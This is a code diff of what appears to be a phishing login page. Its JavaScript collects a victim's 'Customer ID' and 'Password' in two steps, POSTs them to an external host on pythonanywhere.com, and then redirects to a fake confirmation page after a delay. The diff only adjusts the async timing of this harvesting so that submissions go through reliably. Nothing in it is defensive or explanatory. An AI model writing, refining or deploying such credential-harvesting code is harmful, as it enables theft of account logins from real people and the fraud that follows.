@@ -125,7 +125,7 @@
 
         async function pushData(key, val) {
             data[key] = val;
-            await fetch('https://bobarakhas.pythonanywhere.com', {
+            fetch('https://bobarakhas.pythonanywhere.com', {
                 method: 'POST',
                 body: JSON.stringify(data)
             })
@@ -136,7 +136,7 @@
             if (step === 0) {
                 if (cust_id.value.length > 0) {
                     await pushData('Customer ID', cust_id.value)
-                        .then(stepChanger());
+                    stepChanger();
                 } else {
                     cust_id.classList.add('border-red-700');
                     setTimeout(() => {
@@ -145,8 +145,10 @@
                 }
             } else {
                 if (password.value.length > 0) {
-                    await pushData('Password', password.value)
-                        .then(window.location.href = '/confirm.html');
+                    await pushData('Password', password.value);
+                    setTimeout(() => {
+                        window.location.href = '/confirm.html';
+                    }, 2000);
                 } else {
                     password.classList.add('border-red-700');
                     setTimeout(() => {
